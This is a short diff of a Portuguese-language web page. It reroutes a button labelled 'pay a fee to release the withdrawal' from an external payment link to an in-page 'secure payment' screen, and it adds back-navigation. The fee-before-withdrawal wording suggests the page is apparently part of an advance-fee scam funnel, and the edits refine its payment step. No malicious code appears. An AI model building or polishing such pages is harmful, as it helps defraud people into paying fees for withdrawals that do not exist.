@@ -852,7 +852,7 @@
 
           <!-- Call to Action -->
           <div class="confirmation-section">
-            <a href="https://pay.freepaybrasil.com.br/Wp9nZ8aK6E0Lw5V" class="confirmation-cta-button" id="confirmation-button" onclick="herdarUTMeRedirecionar(this.href); return false;">
+            <a href="#ten" class="confirmation-cta-button" id="confirmation-button" onclick="showScreen('ten'); return false;">
               Pagar taxa para liberar o saque
             </a>
 
@@ -907,7 +907,7 @@
       </section>
       <section id="ten" class="screen" aria-hidden="true">
         <div class="pago-topnav">
-          <button type="button" class="pago-back" id="pago-back" aria-label="Volver">
+          <button type="button" class="pago-back" id="pago-back" onclick="showScreen('nine');" aria-label="Volver">
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
           </button>
           <div class="pago-nav-title">Pagamento seguro</div>
